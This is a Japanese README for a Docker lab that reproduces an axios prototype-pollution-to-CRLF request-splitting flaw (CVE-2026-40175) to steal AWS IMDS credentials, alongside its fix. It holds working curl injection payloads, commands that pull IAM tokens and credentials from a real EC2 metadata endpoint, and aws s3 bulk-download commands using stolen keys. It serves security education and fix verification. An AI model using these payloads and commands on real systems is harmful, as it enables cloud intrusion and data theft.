# CVE-2026-40175 ローカル再現ラボ

> **免責事項**: 本ラボは技術記事執筆・教育目的のためのものです。自分が管理するローカル環境以外での実行は絶対にしないでください。

---

## 概要

| 項目 | 内容 |
| ------ | ------ |
| 脆弱性 | プロトタイプ汚染をGadget攻撃チェーンでRCE / フルクラウド侵害にエスカレート |
| CVE | [CVE-2026-40175](https://www.cvedetails.com/vulnerability-list/vendor_id-19831/product_id-54129/year-2026/opec-1/Axios-Axios.html) |
| CVSS | 10.0 (Critical) |
| EPSS | 0.24% |
| 公開日 | 2026-04-10 |
| 脆弱バージョン | axios < 1.15.0 |
| プロトタイプ汚染の再現 | 脆弱な deepMerge（for...in）で `__proto__` キーを素通りさせる |

### 攻撃チェーン

```text
[攻撃者]
    │
    │ 1. {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}
    │    を POST ボディに仕込む
    ▼
[SSRサーバー / Node.jsバックエンド]
    │   脆弱な deepMerge（for...in 使用）がボディをマージ
    │   → Object.prototype["x-inject"] が汚染される
    │   (lodash < 4.17.17 / jQuery < 3.4.0 などが同様の実装を持っていた)
    │
    │ 2. 内部APIへリクエスト
    │   → for...in でヘッダーを収集する実装が汚染値を取り込む
    │   → \r\n\r\n でHTTPリクエストが分裂（HTTP Request Splitting）
    ▼
[AWS IMDS / 内部サービス]
    │   PUT /latest/api/token が密輸される
    │   → IMDSv2トークンが発行される
    ▼
[攻撃者]
    IAM認証情報（AccessKey, SecretKey, SessionToken）を窃取
```

### なぜブラウザからは直接攻撃できないのか

ブラウザ環境には3層の防御があり、CRLFインジェクションをブロックします。

```text
[ブラウザ]
    1. axios ブラウザ版 (XHRアダプター)
       → Object.keys() でヘッダーを処理するため、プロトタイプ汚染を無視
    2. XMLHttpRequest の仕様
       → \r\n を含む値を setRequestHeader() で拒否
    3. ブラウザのネットワーク層
       → 送信前にヘッダー値をフィルタリング
```

**本当の危険はサーバーサイドの axios**（SSR、マイクロサービス、Lambda等）にあります。

---

## 攻撃者が狙うもの — AWS IMDSとクレデンシャル窃取

この攻撃の最終目的は **AWSのIAM一時認証情報（AccessKeyId / SecretAccessKey / SessionToken）の窃取** です。これが取れると、攻撃者はEC2インスタンスの外部からそのAWSアカウントのリソースを操作できるようになります。

---

### AWS IMDSとは何か

IMDS（Instance Metadata Service）は、EC2インスタンスが自分自身の情報（IAMクレデンシャル、インスタンスID、リージョン等）を取得するためにAWSが提供する内部エンドポイントです。

```text
┌─────────────────────────────────────────────────────────┐
│  EC2インスタンスの内部                                    │
│                                                         │
│  アプリ → GET 169.254.169.254 → IAMクレデンシャル返却    │
│           ^^^^^^^^^^^^^^^^                              │
│           リンクローカルアドレス                          │
│           EC2の外からはルーティングされない（到達不可）    │
└─────────────────────────────────────────────────────────┘
```

| 特性 | 内容 |
| ------ | ------ |
| IPアドレス | `169.254.169.254`（リンクローカル） |
| アクセス範囲 | そのEC2インスタンス内部からのみ到達可能 |
| 有効状態 | **デフォルトで有効**。無効化しない限り常に開いている |
| 本番環境での現実 | 本番EC2の大多数にIAMロールが紐付いており、クレデンシャルを取得できる |

---

### IMDSv1 vs IMDSv2 — SSRFへの対策の変遷

AWSはSSRF（Server-Side Request Forgery）対策として2019年にIMDSv2を導入しました。

```text
IMDSv1（旧方式）: GETだけで即座にクレデンシャル取得
───────────────────────────────────────────────────────
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
  → クレデンシャルがそのまま返る（SSRFで1発で盗める）

IMDSv2（新方式）: PUTでトークン取得が必要
───────────────────────────────────────────────────────
  Step1: PUT http://169.254.169.254/latest/api/token
         X-aws-ec2-metadata-token-ttl-seconds: 21600
         → セッショントークンが返る

  Step2: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
         X-aws-ec2-metadata-token: <Step1のトークン>
         → クレデンシャルが返る
```

**IMDSv2がSSRF対策になる理由:**

IMDSv2のStep 1はPUTメソッドが必要です。加えて、IMDSはTTL=1のホップ数制限を持っており、**リダイレクトをフォローしません**。

この組み合わせにより、以下のような典型的なSSRFシナリオを防げます：

- `?url=` パラメータを別サービスに転送するだけの脆弱性（リダイレクト経由）
- SSRF-to-redirect 型の攻撃（リダイレクト先をIMDSに向ける手法）

ただし「SSRFは必ずGETしか送れない」わけではなく、サーバー側の実装次第でPOST/PUTを送れる場合もあります。IMDSv2はすべてのSSRFを防ぐ銀の弾丸ではなく、典型的なSSRFシナリオに対する防御層の一つです。

---

### なぜこのCVEがIMDSv2を突破するのか

CRLFインジェクション（HTTP Request Splitting）を使えば、GETリクエストの中にPUTリクエストを「密輸」できます。

```text
攻撃者が送るペイロード（一見ただのJSONボディ）:
  {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n..."}}
                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                              CRLFで区切られた密輸リクエスト

SSRサーバーが内部API（IMDS）に実際に送るTCPストリーム:
  GET /api/healthcheck HTTP/1.1\r\n    ← 正規リクエスト
  Host: 169.254.169.254\r\n
  x-inject: dummy\r\n
  \r\n                                 ← ここでリクエスト1が終了
  PUT /latest/api/token HTTP/1.1\r\n  ← 密輸されたリクエスト！
  Host: 169.254.169.254\r\n
  X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n
  \r\n

IMDSは2つのリクエストとして解釈:
  [1] GET /api/healthcheck  （無害）
  [2] PUT /latest/api/token （IMDSv2トークン発行！）
```

---

### 窃取されるもの — IAM一時認証情報

IMDSv2トークンが取得できれば、以下のレスポンスが得られます（本ラボの `mock-imds/server.js` が返す偽データの構造）:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-11T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA_FAKE_ACCESS_KEY_ID",
  "SecretAccessKey": "FAKE/SECRET/ACCESS/KEY/FOR/DEMO",
  "Token": "FAKE_SESSION_TOKEN_DEMO_ONLY",
  "Expiration": "2026-04-12T00:00:00Z"
}
```

| フィールド | 役割 |
| ----------- | ------ |
| `AccessKeyId` | AWS APIの署名に使うキーID（`ASIA`で始まる場合は一時キー） |
| `SecretAccessKey` | APIリクエストの署名生成に使う秘密鍵 |
| `Token` | 一時クレデンシャルを示すセッショントークン（必須） |
| `Expiration` | 有効期限（通常1〜6時間。期限後は再取得が必要） |

**本ラボでcurlを使って実際に取得してみる:**

```bash
# ターミナル1: mock-imds のログを監視（着弾確認）
docker logs -f mock-imds

# ターミナル2: Step1 — IMDSv2トークンを取得
TOKEN=$(curl -s -X PUT "http://localhost:8080/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo "取得したトークン: ${TOKEN}"
# → FAKE-IMDS-TOKEN-AAABBBCCC111222

# Step2 — IAMクレデンシャルを取得
curl -s "http://localhost:8080/latest/meta-data/iam/security-credentials/MyRole" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}" | jq .
```

**期待される出力:**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-11T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA_FAKE_ACCESS_KEY_ID",
  "SecretAccessKey": "FAKE/SECRET/ACCESS/KEY/FOR/DEMO",
  "Token": "FAKE_SESSION_TOKEN_DEMO_ONLY",
  "Expiration": "2026-04-12T00:00:00Z"
}
```

**トークンなしでアクセスした場合（IMDSv2の防御を確認）:**

```bash
# X-aws-ec2-metadata-token ヘッダーなし → 401 Unauthorized
curl -v "http://localhost:8080/latest/meta-data/iam/security-credentials/MyRole"
# → HTTP/1.1 401 Unauthorized
```

### 参考: 実際のAWS EC2インスタンス内での操作（ラボ外）

#### 前提条件（これが揃っていないとIMDSへのアクセスは成立しない）

| 条件 | 内容 | 確認方法 |
| ------ | ------ | --------- |
| EC2インスタンス上で実行している | 169.254.169.254 はEC2外からルーティングされないリンクローカルアドレス | `curl -s --max-time 2 http://169.254.169.254/latest/meta-data/` が応答するか |
| IMDSが有効になっている | デフォルトで有効。コンソールまたはTerraformで `http_endpoint = "enabled"` を確認 | 上記curlがタイムアウトしなければ有効 |
| EC2にIAMロールが紐付いている | インスタンスプロファイルが設定されていないとクレデンシャルエンドポイントが空を返す | AWSコンソール → EC2 → インスタンス → IAMロール欄を確認 |
| IMDSv2が要求される場合はPUTが必要 | `hop_limit=1` によりリダイレクト経由の攻撃をブロック。TTLは通常21600秒（6時間） | IMDSv1のみ有効な場合はPUTなしでもGETが通る |

#### 操作手順と期待されるレスポンス

```bash
# Step 1: IMDSv2セッショントークンを取得
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo "Token: ${TOKEN}"
# 期待値: 長いBase64風の文字列が返る
# 例: AQAEAHr9...（数百文字）
# 空文字の場合 → IMDSv2が設定されていないか、EC2外で実行している

# Step 2: 紐付いているIAMロール名を取得
ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}")
echo "Role: ${ROLE}"
# 期待値: IAMロール名がそのまま返る（JSONではなくプレーンテキスト）
# 例: itg-bastion-role
# 空文字の場合 → インスタンスプロファイルが設定されていない

# Step 3: IAM一時認証情報を取得
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}"
# 期待値: 以下のようなJSONが返る
```

**Step 3 の期待されるレスポンス（成功時）:**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-12T08:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...（長いセッショントークン）",
  "Expiration": "2026-04-12T14:00:00Z"
}
```

| フィールド | 見方 |
| ----------- | ------ |
| `Code: "Success"` | クレデンシャル取得が正常に完了した証拠 |
| `AccessKeyId` | `ASIA` で始まる → 一時キー（AssumeRoleで発行される種別） |
| `Expiration` | 通常1〜6時間後。期限後は自動ローテーションされる |
| `Token` | 必須。これなしで AWS API を叩くと `InvalidClientTokenId` エラーになる |

**このレスポンスが攻撃で何を意味するか:**

```text
攻撃者はこの3値（AccessKeyId / SecretAccessKey / Token）を手に入れれば
EC2の外部から AWS CLI / SDK を使い、IAMロールの権限を完全に行使できる。

export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

aws s3 ls   ← EC2の外から実行しているのに、IAMロールの権限で通る
```

---

### クレデンシャルが盗まれると何ができるか

3つの値が揃えば、攻撃者は **EC2の外部から** そのIAMロールの権限をすべて行使できます。

```bash
# 攻撃者のPC（EC2の外部）での操作
export AWS_ACCESS_KEY_ID="ASIA_FAKE_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="FAKE/SECRET/ACCESS/KEY/FOR/DEMO"
export AWS_SESSION_TOKEN="FAKE_SESSION_TOKEN_DEMO_ONLY"

# IAMロールの権限次第で以下が可能になる
aws s3 ls                                     # S3バケット一覧の列挙
aws s3 cp s3://prod-bucket/ . --recursive     # 本番データの一括ダウンロード
aws ec2 describe-instances                    # インフラ構成の把握
aws secretsmanager list-secrets               # Secrets Managerの一覧取得
aws iam list-users                            # IAMユーザー一覧（横展開の準備）
```

**影響の連鎖:**

```text
IAMクレデンシャル窃取
    ↓
S3データ流出（顧客データ・機密ドキュメント）
    ↓
RDS/DynamoDBへの接続情報取得（Secrets Manager経由）
    ↓
他のEC2・Lambdaへの横展開
    ↓
APIキー・DBパスワード・外部サービス認証情報の全取得
    ↓
AWSアカウント全体の完全侵害
```

影響範囲は紐付いているIAMロールの権限次第ですが、実際のアプリケーションは「S3 Full Access」「RDS Full Access」など広い権限を持つことが多く、重大なデータ漏洩につながります。

> **本ラボとの対応**: `mock-imds/server.js` がこのIMDSの挙動を再現しています。  
> `docker logs -f mock-imds` で、攻撃が着弾し偽クレデンシャルが発行される瞬間をリアルタイムに観察できます。

---

## ディレクトリ構成

```text
axios-vuln-1.5.0/
├── docker-compose.yml
├── README.md
│
├── mock-imds/          # 偽AWSメタデータサーバー（169.254.169.254の代役）
│   ├── Dockerfile
│   └── server.js       # IMDSv2トークン発行・IAM認証情報を返す
│
├── victim/             # 攻撃スクリプト実行環境
│   ├── Dockerfile
│   ├── package.json    # axios@1.14.0（脆弱バージョン）
│   ├── exploit.js      # プロトタイプ汚染 + net.Socket で攻撃を再現
│   ├── safe.js         # axios の CRLF バリデーション層を検証（v1.14.0=脆弱・v1.15.0=修正済みを確認）
│   └── test.js         # node:test を使った自動テスト（npm test で実行）
│
└── ssr-app/            # 脆弱なNode.jsバックエンド（攻撃対象）
    ├── Dockerfile
    ├── package.json    # axios@1.14.0（脆弱バージョン）
    └── server.js       # 脆弱/安全なエンドポイントを持つExpressサーバー
```

---

## 起動方法

```bash
# ビルド
docker compose build

# 全サービス起動
docker compose up -d

# ログ監視（攻撃の受信を確認）
docker logs -f mock-imds
```

| サービス | URL | 用途 |
| --------- | ----- | ------ |
| mock-imds | <http://localhost:8080> | 偽AWSメタデータサーバー（攻撃の着弾点） |
| ssr-app | <http://localhost:4000/api/profile> | 脆弱なエンドポイント（攻撃対象） |

---

## デモ手順

攻撃対象はNode.jsサーバー（ssr-app）のAPIエンドポイントです。curlで直接叩きます。

### シナリオA: curlで攻撃を実行する（成功）

**ターミナル1でログ監視を開始:**

```bash
docker logs -f mock-imds
```

**ターミナル2で攻撃を実行:**

```bash
# プロトタイプ汚染ペイロードをPOST（これだけが攻撃者の操作）
curl -s -X POST http://localhost:4000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: mock-imds\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n"}}' \
  | jq '{prototypePolluted, leakedHeaders, rawRequestSent}'
```

**ターミナル2のレスポンスで確認すること:**

```json
{
  "prototypePolluted": true,
  "leakedHeaders": [
    { "key": "x-inject", "value": "dummy\r\n\r\nPUT /latest/api/token..." }
  ],
  "rawRequestSent": "GET /api/healthcheck HTTP/1.1\r\nHost: mock-imds\r\nx-inject: dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n..."
}
```

**ターミナル1（mock-imds ログ）で確認すること:**

```text
[IMDS] GET /api/healthcheck           ← 正規のリクエスト
[IMDS] PUT /latest/api/token          ← 密輸されたリクエスト！
[IMDS] ⚠️  IMDSv2トークン発行リクエスト検知！TTL=21600
[IMDS] 🔑 偽トークンを返します...
[IMDS] GET /latest/meta-data/iam/security-credentials/MyRole
[IMDS] 🚨 IAM認証情報が窃取されました！
```

`PUT /latest/api/token` が届いていれば攻撃成功です。

---

### シナリオB: 防御版と比較する

```bash
# safeDeepMerge（Object.keys() + __proto__スキップ）を使うエンドポイント
curl -s -X POST http://localhost:4000/safe/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}' \
  | jq '{prototypePolluted}'
```

**期待される結果:**

```json
{ "prototypePolluted": false }
```

ターミナル1（mock-imds）には `PUT /latest/api/token` が届きません。

---

### シナリオC: Node.jsスクリプトで直接再現

```bash
# exploit.js: net.Socket で CRLFを密輸（攻撃の再現）
docker compose run --rm victim node exploit.js

# safe.js: axios に CRLF ヘッダーを直接渡してバリデーションを検証
# → axios@1.14.0（デフォルト）では CRLF が素通りする（脆弱）
docker compose run --rm victim node safe.js
```

`exploit.js` は axios を使わず `net.Socket` で生 TCP を直接送ることで、axios の CRLF バリデーションをバイパスします。

`safe.js` はカスタムアダプターを使って実際の HTTP 通信を行わず、axios のヘッダーバリデーション層だけを検証します。インストール済みのバージョンに応じて結果が変わります。axios@1.14.0 では CRLF がアダプターまで素通りし、axios@1.15.0 では `assertValidHeaderValue` がアダプター呼び出し前にエラーを投げます。

> **ポイント**: `safe.js` の検証は axios の CRLF バリデーションを直接テストしています。Node.js の http モジュールは介しないため、Node.js バージョンに関係なく axios 自身の差が明確に出ます。

---

## 技術的背景

### なぜ「プロトタイプ汚染 → CRLF」という経路が成立するのか

JavaScriptの`for...in`は、オブジェクト自身のプロパティだけでなく、**プロトタイプチェーン上のプロパティも列挙します**。

```javascript
// 攻撃者がプロトタイプを汚染する
Object.prototype['x-inject'] = 'dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n...';

// 開発者が書いた「普通の」コード（脆弱な実装）
const headers = {};
for (const key in headers) {        // ← ここで x-inject が漏洩する
  requestHeaders[key] = headers[key];
}
```

### 脆弱な deepMerge でのプロトタイプ汚染

`for...in` でオブジェクトをマージする実装は `__proto__` キーを特別扱いしないため、ユーザー入力から `Object.prototype` を汚染できます。

```javascript
// 攻撃者が送信するJSONボディ
{ "__proto__": { "x-inject": "dummy\r\n\r\nPUT /latest/api/token..." } }

// 脆弱な deepMerge（for...in 使用）でマージすると
// → Object.prototype["x-inject"] = "dummy\r\n..." が設定される

// 安全な実装（Object.keys() + __proto__ スキップ）
for (const key of Object.keys(source)) {
  if (key === '__proto__') continue;  // ← これだけで防げる
  ...
}
```

lodash < 4.17.17 / jQuery < 3.4.0 / 多くの自作マージ関数が同様の問題を持っていました。

### 攻撃成立の2つの条件

この攻撃は **2つの条件が AND で重なった時にのみ成立** します。片方だけでは攻撃は止まります。

```text
条件① サーバー側コードに for...in がある
       ↓
       Object.prototype['x-inject'] = 'dummy\r\n...' が汚染されていると
       for...in がそれを拾い、axios に渡す headers に混入する

条件② axios v1.14.0 が CRLF を検証しない
       ↓
       混入した値の \r\n を弾かずそのまま HTTP 送信してしまう
```

| 条件 | 内容 | どこの問題か |
| ------ | ------ | ------------ |
| ① `for...in` でヘッダーを組み立てている | プロトタイプ汚染された値を拾ってしまう | サーバー側コード |
| ② axios が CRLF を検証しない | 値に `\r\n` が含まれていても素通りする | axios v1.14.0 |

片方だけの対策でも攻撃は止まります：

```text
① だけ塞ぐ（for...in を使わない）
  → 汚染された値が axios に届かない → 攻撃不成立

② だけ塞ぐ（axios を 1.15.0 以上にする）
  → axios が CRLF を含む値を即エラーにする → 攻撃不成立
```

ただし、両方対策するのが正しい姿勢です。

---

### axios v1.14.0 の実際の脆弱箇所：`normalizeValue` の正規表現

axios 自体は `utils.forEach` の中で `Object.keys()` を使っており、`for...in` は内部にありません。

問題は `AxiosHeaders.js` の `normalizeValue` 関数にある正規表現です：

```javascript
// v1.14.0（修正前）の normalizeValue
function normalizeValue(value) {
  if (value === false || value == null) {
    return value;
  }
  return utils.isArray(value)
    ? value.map(normalizeValue)
    : String(value).replace(/[\r\n]+$/, '');  // ← 末尾だけ除去
    //                             ↑ $ があるので「中間」の \r\n は素通り
}
```

```text
入力:   "dummy\r\nPUT /latest/api/token HTTP/1.1\r\n..."
末尾の \r\n だけ除去 →
出力:   "dummy\r\nPUT /latest/api/token HTTP/1.1\r\n..."
         ↑ 中間の \r\n はそのまま残る → HTTP Request Splitting 成立
```

---

### 修正版（axios@1.15.0）が防ぐもの

PR [#10660](https://github.com/axios/axios/pull/10660) で `assertValidHeaderValue` が追加されました。`\r` または `\n` が**1文字でもあれば**即エラーにします。

```javascript
// v1.15.0（修正後）に追加されたバリデーション
const isValidHeaderValue = (value) => !/[\r\n]/.test(value);
//                                          ↑ $ なし → どこにあっても検出

function assertValidHeaderValue(value, header) {
  if (value === false || value == null) return;
  if (!isValidHeaderValue(String(value))) {
    throw new Error(`Invalid character in header content ["${header}"]`);
  }
}

// ヘッダーをセットする全パスで必ず呼ばれる
self[key || _header] = normalizeValue(_value);  // ← この前に assertValidHeaderValue を実行
```

```javascript
// axios@1.15.0 での動作
axios.get(url, {
  headers: { 'x-inject': 'dummy\r\nX-injected: value' }
});
// → Error: Invalid character in header content ["x-inject"]
```

---

### 防御策の比較：アプリ側 vs axios 側

| 対策 | 実装場所 | 仕組み | CVE の修正か |
| ---- | ------- | ------ | ---------- |
| `safeDeepMerge`（`Object.keys()` + `__proto__` スキップ） | アプリケーション | プロトタイプ汚染を防ぎ、汚染値が axios に届かないようにする | × アプリ側の対策 |
| axios@1.15.0（`assertValidHeaderValue`） | axios ライブラリ | `\r\n` を含むヘッダー値を即エラーにする | ✓ CVE の修正 |

シナリオB がブロックできるのはアプリ側の `safeDeepMerge` のおかげです。`Object.keys()` がプロトタイプチェーンを辿らないため、汚染された値が axios に届きません。

CVE の本質的な修正は axios@1.15.0 の **CRLF バリデーション** です。仮にアプリ側に `for...in` が残っていても、axios@1.15.0 以上であれば `\r\n` を含む値をヘッダーにセットしようとした瞬間にエラーになります。逆に言えば、`safeDeepMerge` だけ入れても axios が古いままであれば、別の経路でプロトタイプ汚染が起きた場合には攻撃が成立しえます。

---

## クリーンアップ

```bash
docker compose down --volumes --rmi all
```

---

## 攻撃体験ウォークスルー

「何がどの順序で起きているのか」をゼロから実感するための完全な手順です。**全操作はcurlで完結します。**

### Step 0: 環境を起動する

```bash
# 全サービスをビルド＆起動
docker compose up -d --build

# 起動確認（3つのコンテナがすべて Running になるまで待つ）
docker compose ps
```

| コンテナ | ポート | 役割 |
| --------- | ------- | ------ |
| mock-imds | localhost:8080 | 偽AWSメタデータサーバー（攻撃の着弾点） |
| ssr-app | localhost:4000 | 脆弱なNode.jsバックエンド（攻撃対象） |
| victim | なし | Node.jsスクリプト実行用 |

```bash
# ターミナル1: mock-imds のログをリアルタイム監視
docker logs -f mock-imds
```

---

### Step 1: 攻撃を実行する（メインシナリオ）

**ターミナル2で実行:**

```bash
curl -s -X POST http://localhost:4000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: mock-imds\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n"}}' \
  | jq '{prototypePolluted, leakedHeaders, rawRequestSent}'
```

**攻撃チェーンの内訳（サーバー内部で自動的に起きること）:**

```text
攻撃者のcurl: POST /api/profile
  ボディ: {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}
                        ↓
[1] JSON.parse → __proto__ が own property として残る
[2] vulnerableDeepMerge（for...in）→ Object.prototype["x-inject"] 汚染
[3] sendToInternalAPI の for...in → x-inject がヘッダーに漏洩
[4] net.Socket で生TCP送信 → \r\n\r\n でリクエストが分裂
                        ↓
mock-imds: PUT /latest/api/token を受信 → IMDSv2トークン発行
```

**ターミナル1（mock-imds ログ）:**

```text
[IMDS] GET /api/healthcheck           ← 正規のリクエスト
[IMDS] PUT /latest/api/token          ← 密輸されたリクエスト！
[IMDS] ⚠️  IMDSv2トークン発行リクエスト検知！TTL=21600
[IMDS] 🔑 偽トークンを返します...
[IMDS] GET /latest/meta-data/iam/security-credentials/MyRole
[IMDS] 🚨 IAM認証情報が窃取されました！
```

---

### Step 2: 修正版と比較する

```bash
curl -s -X POST http://localhost:4000/safe/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}' \
  | jq '{prototypePolluted, mergeFunction}'
```

**期待される結果:**

```json
{
  "prototypePolluted": false,
  "mergeFunction": "safeDeepMerge（Object.keys() + __proto__ スキップ）"
}
```

ターミナル1に `PUT /latest/api/token` は届きません。`Object.keys()` が `__proto__` キーを無視するため汚染が発生しない。

---

### Step 3: Node.jsスクリプトで CVE を直接検証する

**axios@1.14.0 が脆弱であることを確認:**

```bash
# exploit.js: net.Socket でCRLFを密輸（攻撃の再現）
docker compose run --rm victim node exploit.js
```

**期待される出力:**

```text
[1] Object.prototype["x-inject"] を汚染しました
    値: CRLF + 密輸リクエスト (PUT /latest/api/token)

[2] プロトタイプ汚染の伝播を検証...
    ⚠️  プロトタイプから漏洩: x-inject = "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHo...

[3] 通常のAxiosリクエストを模倣（net.Socketでバイパス）...
[3] ソケット接続完了。汚染されたHTTPリクエストを送信...

[4] mock-imdsの応答 (1件目):
    HTTP/1.1 200 OK

[5] 攻撃結果:
    ✅ 攻撃成功！密輸リクエスト (PUT /latest/api/token) が mock-imds に届いた
    → IMDSv2トークンが発行された（mock-imdsのログを確認）
```

```bash
# safe.js: axios に CRLF ヘッダーを直接渡してバリデーションを確認
# → axios@1.14.0 では CRLF が素通りする（脆弱）
docker compose run --rm victim node safe.js
```

**期待される出力（axios@1.14.0 = 脆弱）:**

```text
=== CVE-2026-40175 検証 (axios@1.14.0) ===

[3] ★ CVE 検証: CRLF を含むヘッダーを axios に直接渡す...

    ⚠️  [axios@1.14.0] CRLF がバリデーションされずにアダプターに到達！
    実際に送信されようとしたヘッダー値:
    "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600"

    → このバージョンは CVE-2026-40175 に対して脆弱です。
```

**axios@1.15.0 にアップグレードして修正を確認:**

```bash
# コンテナ内で axios@1.15.0 に差し替えて同じテストを実行
docker compose run --rm victim sh -c "npm install axios@1.15.0 && node safe.js"
```

**期待される出力（axios@1.15.0 = 修正済み）:**

```text
=== CVE-2026-40175 検証 (axios@1.15.0) ===

[3] ★ CVE 検証: CRLF を含むヘッダーを axios に直接渡す...

    ✅ [axios@1.15.0] ブロックされました: Invalid character in header content ["x-inject"]
    → assertValidHeaderValue が CRLF を検出し、アダプターへ到達する前にエラーを投げた！
    → CVE-2026-40175 に対して修正済みです。
```

**`Invalid character in header content` というエラーが出ることが、axios@1.15.0 の修正が正しく動作していることの証明です。**

---

### Step 4: パケットレベルで攻撃を観察する

```bash
# ターミナル1: TCPパケットを捕捉
docker compose exec mock-imds tcpdump -A -i eth0 port 80

# ターミナル2: Step 1 の curl を実行
```

1つのTCPパケットに複数のHTTPリクエストが詰まっているのが見えます:

```text
GET /api/healthcheck HTTP/1.1
Host: mock-imds
x-inject: dummy

PUT /latest/api/token HTTP/1.1        ← 密輸された別リクエスト
Host: mock-imds
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET /latest/meta-data/iam/security-credentials/MyRole HTTP/1.1
Host: mock-imds
```

これがHTTP Request Splittingの実体です。サーバーは1つのリクエストを送ったつもりでも、受信側は3つのリクエストとして解釈します。

---

### まとめ: 何を学んだか

| 検証項目 | 結果 |
| --------- | ------ |
| curlで `__proto__` ペイロードを脆弱エンドポイントに送信 | 攻撃成立・IMDSv2トークン発行 |
| curlで `__proto__` ペイロードを安全エンドポイントに送信 | ブロックされる（`__proto__` 汚染の防御） |
| `express.text()` + `JSON.parse` + `for...in` merge | プロトタイプ汚染が通過する |
| `express.json()` + `safeDeepMerge`（`Object.keys()`） | プロトタイプ汚染がブロックされる |
| `safe.js` を axios@1.14.0 で実行（CRLF を直接渡す） | エラーなしで素通り → **脆弱** |
| `safe.js` を axios@1.15.0 で実行（CRLF を直接渡す） | `Invalid character in header content` → **修正済み** |

**本質的な教訓:**

- **`for...in` でヘッダーを組み立てない** — プロトタイプ汚染された値を拾ってしまう
- **`__proto__` ブロックだけでは CVE-2026-40175 への対策にならない** — axios 側のCRLFバリデーションが必須
- **axios@1.15.0 への更新が必要な理由** — `assertValidHeaderValue` が `\r\n` を含む値を即エラーにする
- CVE の修正を「検証」するには `Invalid character in header content` エラーが出ることを確認する
